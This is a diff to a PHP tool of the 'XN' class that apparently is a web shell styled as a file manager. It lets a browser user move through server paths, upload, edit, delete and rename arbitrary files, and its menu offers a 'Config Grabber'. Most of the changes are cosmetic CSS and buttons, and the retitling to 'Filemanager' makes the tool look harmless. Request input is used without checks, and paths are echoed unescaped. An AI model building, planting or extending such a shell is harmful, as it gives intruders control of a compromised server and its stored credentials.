@@ -188,10 +188,10 @@ class XN {
     public static function hdd($type = null) {
         switch ($type) {
             case 'free':
-                return self::formatSize(disk_free_space(getcwd()));
+                return self::formatSize(disk_free_space($_SERVER['DOCUMENT_ROOT']));
                 break;
             case 'total':
-                return self::formatSize(disk_total_space(getcwd()));
+                return self::formatSize(disk_total_space($_SERVER['DOCUMENT_ROOT']));
                 break;
         }
         
@@ -216,90 +216,90 @@ if (isset($_GET['x'])) {
     XN::cd($_GET['x']);
 }
 function search() {
-	?> <input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"> <?php
+    ?> <input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name"> <?php
 }
 function head($x, $y, $class = null) {
-	?>
-	<div class="back">
+    ?>
+    <div class="back">
         <a href="?x=<?= $y ?>">
             <i class="fa fa-arrow-left" aria-hidden="true"></i>
         </a>
         <span>
             <?= $x ?>
         </span>
-        <button class="dropdown-toggle" title="Menu">
+        <button class="dropdown-toggle toggle" title="Menu">
             <i class="fa fa-ellipsis-h" aria-hidden="true"></i>
         </button>
         <ul class="dropdown-tool">
-        	<form method="post" action="?x=<?= getcwd() ?>">
-        		<li>
-        			<button onclick="location.href='?x='" type="button">
-        				<div class="icon">
-        					<a><i class="fa fa-home" aria-hidden="true"></i></a>
-        				</div>
-        				<div class="font">
-        					Home
-        				</div>
-        			</button>
-        		</li>
-        		<li>
-        			<button name="action" value="">
-        				<div class="icon">
-        					<a><i class="fa fa-upload" aria-hidden="true"></i></a>
-        				</div>
-        				<div class="font">
-        					Upload
-        				</div>
-        			</button>
-        		</li>
-        		<li>
-        			<button name="action" value="">
-        				<div class="icon">
-        					<a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
-        				</div>
-        				<div class="font">
-        					Add File
-        				</div>
-        			</button>
-        		</li>
-        		<li>
-        			<button name="action" value="">
-        				<div class="icon">
-        					<a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
-        				</div>
-        				<div class="font">
-        					Add Folder
-        				</div>
-        			</button>
-        		</li>
-        		<li>
-        			<button name="action" value="">
-        				<div class="icon">
-        					<a><i class="fa fa-cog" aria-hidden="true"></i></a>
-        				</div>
-        				<div class="font">
-        					Config Grabber
-        				</div>
-        			</button>
-        		</li>
-        		<li>
-        			<button>
-        				<div class="icon">
-        					<a><i class="fa fa-power-off" aria-hidden="true"></i></a>
-        				</div>
-        				<div class="font">
-        					Logout
-        				</div>
-        			</button>
-        		</li>
-        		<input type="hidden" name="file" value="<?= $dir['name'] ?>">
-        	</form>
+            <form method="post" action="?x=<?= getcwd() ?>">
+                <li>
+                    <button onclick="location.href='?x='" type="button">
+                        <div class="icon">
+                            <a><i class="fa fa-home" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Home
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button name="action" value="">
+                        <div class="icon">
+                            <a><i class="fa fa-upload" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Upload
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button name="action" value="">
+                        <div class="icon">
+                            <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Add File
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button name="action" value="">
+                        <div class="icon">
+                            <a><i class="fa fa-plus-square" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Add Folder
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button name="action" value="">
+                        <div class="icon">
+                            <a><i class="fa fa-cog" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Config Grabber
+                        </div>
+                    </button>
+                </li>
+                <li>
+                    <button>
+                        <div class="icon">
+                            <a><i class="fa fa-power-off" aria-hidden="true"></i></a>
+                        </div>
+                        <div class="font">
+                            Logout
+                        </div>
+                    </button>
+                </li>
+                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
+            </form>
         </ul>
         <div class="mobile">
-        	<input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
+            <input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
         </div>
     </div>
-	<?php
+    <?php
 }
 function alert($message) {
     ?>
@@ -315,7 +315,7 @@ function alert($message) {
 <style type="text/css">
     @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
     body {
-    	background: #e2e1e0;
+        background: #e2e1e0;
         color: #292929;
         overflow: hidden;
         margin: 0;
@@ -330,18 +330,19 @@ function alert($message) {
         padding-left:20px;
     }
     .back .mobile {
-    	padding-left:25px;
-    	width:98%;
-    	padding-bottom:10px;
+        padding-left:25px;
+        width:98%;
+        padding-bottom:10px;
     }
     .storage {
+        margin-top:7px;
         box-shadow: 0px 2px 2px 0px #e0e0e0;
         padding:25px;
-        padding-top:10px;
         padding-bottom:10px;
     }
     .storage span.title {
         font-size: 23px;
+        font-weight:bold;
     }
     .storage span:nth-child(4) {
         font-size: 10px;
@@ -367,10 +368,10 @@ function alert($message) {
         outline: none;
     }
     .hidden {
-    	display: none;
+        display: none;
     }
     .back button {
-    	margin-top:-5px;
+        margin-top:-5px;
         font-size: 23px;
         background: none;
         border: none;
@@ -450,7 +451,7 @@ function alert($message) {
         resize: none;
     }
     input[type=text] {
-    	padding:10px;
+        padding:10px;
         width:100%;
         border-radius: 5px;
         border: 1px solid #ebebeb;
@@ -537,6 +538,9 @@ function alert($message) {
         padding: .5em 1em;
         border-radius: .2em .2em 0 0;
     }
+    .toggle {
+        padding-right: 6;
+    }
     ul.dropdown {
         display: none;
         position: absolute;
@@ -572,7 +576,7 @@ function alert($message) {
     }
 
     ul.dropdown-tool {
-    	background: #fff;
+        background: #fff;
         display: none;
         position: absolute;
         z-index: 5;
@@ -600,16 +604,16 @@ function alert($message) {
         display: block;
     }
     ul.dropdown-tool li button div.icon {
-    	width:35px;
-    	display: inline-block;
-    	text-align: left;
+        width:35px;
+        display: inline-block;
+        text-align: left;
     }
     ul.dropdown-tool li button div.icon a {
-    	margin-right:-30px;
-    	background: none;
+        margin-right:-30px;
+        background: none;
     }
     ul.dropdown-tool li button div.font {
-    	display: inline-block;
+        display: inline-block;
     }
     ul.dropdown-tool li button:hover {
         cursor: pointer;
@@ -631,17 +635,18 @@ function alert($message) {
         background: #dfeaf5;
     }
     .jqx-alert  {  
-    	margin-top: -300px;
+        margin-top: -200px;
         position: absolute;  
         overflow: hidden;  
-        box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+        border-radius:10px;
+        box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
         z-index: 99999;  
      }  
     .jqx-alert-header   {  
         font-weight: bold;
         width:300px;
         outline: none;
-        border-radius:5px 5px 0px 0px;
+        border-radius:10px 10px 0px 0px;
         overflow: hidden;  
         padding: 10px;
         padding-left:20px; 
@@ -651,8 +656,7 @@ function alert($message) {
         background-color:#fff;   
     }   
     .jqx-alert-content   {  
-        border-radius:0px 0px 5px 5px;
-        box-shadow: 0 0px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+        border-radius:0px 0px 10px 10px;
         outline: none;  
         height:100px;
         overflow: auto;  
@@ -675,43 +679,43 @@ function alert($message) {
         padding: 7px;
     }
     @media (min-width: 320px) and (max-width: 480px) {
-    	body {
-    		margin: 0;
-    	}
-    	.mobile {
-    		padding-left:25px;
-    		width:98%;
-    	}
-    	.files {
-    		width:100%;
-    		height:620px;
-    	}
-    	.block .date .dir-size,
-    	.block .date .file-size {
-        	min-width:55px;
-        	display: inline-block;
-    	}
-    	.block .date .dir-perms,
-    	.block .date .file-perms {
-        	min-width:70px;
-        	display: inline-block;
-    	}
-    	.block .date .dir-time,
-    	.block .date .file-time {
-        	display: none;
-    	}
-    	.block .date .dir-owner,
-    	.block .date .file-owner {
-        	min-width:70px;
-        	text-align: center;
-        	display: inline-block;
-    	}
-    	.back input[type=text] {
-    		width: 100%;
-    	}
-    	.group {
-    		display: none;
-    	}
+        body {
+            margin: 0;
+        }
+        .mobile {
+            padding-left:25px;
+            width:98%;
+        }
+        .files {
+            width:100%;
+            height:620px;
+        }
+        .block .date .dir-size,
+        .block .date .file-size {
+            min-width:55px;
+            display: inline-block;
+        }
+        .block .date .dir-perms,
+        .block .date .file-perms {
+            min-width:70px;
+            display: inline-block;
+        }
+        .block .date .dir-time,
+        .block .date .file-time {
+            display: none;
+        }
+        .block .date .dir-owner,
+        .block .date .file-owner {
+            min-width:70px;
+            text-align: center;
+            display: inline-block;
+        }
+        .back input[type=text] {
+            width: 100%;
+        }
+        .group {
+            display: none;
+        }
     }
 </style>
 <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
@@ -767,7 +771,7 @@ function filterTable() {
         top: 0,  
         left: 0,  
         overlayOpacity: 0.2,  
-        overlayColor: '#ddd',  
+        overlayColor: 'rgba(0, 0, 0, 0.3)',  
         alert: function (message, title) {  
             if (title == null) title = 'Alert !';  
             jqxAlert._show(title, message);  
@@ -846,18 +850,18 @@ function filterTable() {
             }
             break;
         case 'rename':
-        	if (isset($_POST['rename'])) {
-        		if (@rename($_POST['file'], getcwd() . DIRECTORY_SEPARATOR . $_POST['newname'])) {
-        			echo "<script>$(location).attr('href', ?x=".getcwd().")</script>";
-        		} else {
-        			alert("Rename Failed");
-        		}
-        	}
-        	head("Rename", getcwd(), 'hidden');
-        	?>
-        	<div class="rename">
-        		<table>
-        			<tr>
+            if (isset($_POST['rename'])) {
+                if (@rename($_POST['file'], getcwd() . DIRECTORY_SEPARATOR . $_POST['newname'])) {
+                    echo "<script>$(location).attr('href', ?x=".getcwd().")</script>";
+                } else {
+                    alert("Rename Failed");
+                }
+            }
+            head("Rename", getcwd(), 'hidden');
+            ?>
+            <div class="rename">
+                <table>
+                    <tr>
                         <td>
                             Filename
                         </td>
@@ -870,28 +874,28 @@ function filterTable() {
                     <tr>
                         <?php
                         switch ($_POST['file']) {
-                        	case is_dir($_POST['file']):
-                        		?>
-                        		<td>
-                        			Items
-                        		</td>
-                        		<td>:</td>
-                        		<td>
-                            		<?= XN::countDir($_POST['file']) ?> items
-                        		</td>
-                        		<?php
-                        		break;
-                        	default:
-                        		?>
-                        		<td>
-                        			Size
-                        		</td>
-                        		<td>:</td>
-                        		<td>
-                            		<?= XN::size($_POST['file']) ?>
-                        		</td>
-                        		<?php
-                        		break;
+                            case is_dir($_POST['file']):
+                                ?>
+                                <td>
+                                    Items
+                                </td>
+                                <td>:</td>
+                                <td>
+                                    <?= XN::countDir($_POST['file']) ?> items
+                                </td>
+                                <?php
+                                break;
+                            default:
+                                ?>
+                                <td>
+                                    Size
+                                </td>
+                                <td>:</td>
+                                <td>
+                                    <?= XN::size($_POST['file']) ?>
+                                </td>
+                                <?php
+                                break;
                         }
                         ?>
                     </tr>
@@ -905,25 +909,25 @@ function filterTable() {
                         </td>
                     </tr>
                     <tr>
-                    	<form method="post">
+                        <form method="post">
                             <td colspan="3">
                                 <?php
                                 switch ($_POST['file']) {
-                                	case is_dir($_POST['file']):
-                                		?>
-                                		<button name="action" value="delete">Delete</button>
-                                		<button>Rename</button>
-                                		<?php
-                                		break;
-                                	
-                                	default:
-                                		?>
-                                		<button name="action" value="edit">Edit</button>
-                                		<button name="action" value="delete">Delete</button>
-                                		<button disabled>Rename</button>
-                                		<button>Backup</button>
-                                		<?php
-                                		break;
+                                    case is_dir($_POST['file']):
+                                        ?>
+                                        <button name="action" value="delete">Delete</button>
+                                        <button disabled>Rename</button>
+                                        <?php
+                                        break;
+                                    
+                                    default:
+                                        ?>
+                                        <button name="action" value="edit">Edit</button>
+                                        <button name="action" value="delete">Delete</button>
+                                        <button disabled>Rename</button>
+                                        <button>Backup</button>
+                                        <?php
+                                        break;
                                 }
                                 ?>
                             </td>
@@ -944,20 +948,20 @@ function filterTable() {
                             </td>
                         </tr>
                     </form>
-        		</table>
-        	</div>
-        	<?php
-        	exit();
-        	break;
+                </table>
+            </div>
+            <?php
+            exit();
+            break;
         case 'edit':
-        	if (isset($_POST['save'])) {
-            	if (XN::save($_POST['file'], $_POST['data'])) {
-                	alert("Permission Danied");
-            	} else {
-                	alert("success");
-            	}
-        	}
-        	head("Edit", getcwd(), 'hidden');
+            if (isset($_POST['save'])) {
+                if (XN::save($_POST['file'], $_POST['data'])) {
+                    alert("Permission Danied");
+                } else {
+                    alert("success");
+                }
+            }
+            head("Edit", getcwd(), 'hidden');
             ?>
             <div class="edit">
                 <table>
@@ -1024,7 +1028,7 @@ function filterTable() {
     ?>
     <div class="storage">
         <span class="title">
-            STORAGE
+            Filemanager
         </span>
         <br><span>Total : <?= XN::hdd('total') ?></span>
         <span>Free : <?= XN::hdd('free') ?></span>
@@ -1126,12 +1130,48 @@ function filterTable() {
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <?php
                                 switch (XN::getext($file['name'])) {
+                                    case 'mp4':
+                                    case 'mp3':
+                                        ?>
+                                        <li>
+                                            <button>Play</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="delete">Delete</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="rename">Rename</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="backup">Backup</button>
+                                        </li>
+                                        <?php
+                                        break;
+                                    case 'zip':
+                                        ?>
+                                        <li>
+                                            <button>Unzip</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="delete">Delete</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="rename">Rename</button>
+                                        </li>
+                                        <li>
+                                            <button name="action" value="backup">Backup</button>
+                                        </li>
+                                        <?php
+                                        break;
                                     case 'jpg':
                                     case 'png':
                                     case 'gif':
                                     case 'jpeg':
                                     case 'ico':
                                         ?>
+                                        <li>
+                                            <button>Preview</button>
+                                        </li>
                                         <li>
                                             <button name="action" value="delete">Delete</button>
                                         </li>
